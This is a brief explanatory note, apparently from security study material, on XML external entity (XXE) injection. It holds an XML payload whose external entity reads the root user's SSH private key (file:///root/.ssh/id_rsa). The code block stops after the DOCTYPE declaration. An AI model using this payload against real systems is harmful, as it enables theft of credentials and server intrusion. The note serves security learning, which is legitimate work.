When an XML is vulnerable to XXE injection, adding an xxe entity of element foo into the xml file and adding it to the fields afterwards as a reference, can be used to read files and more.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
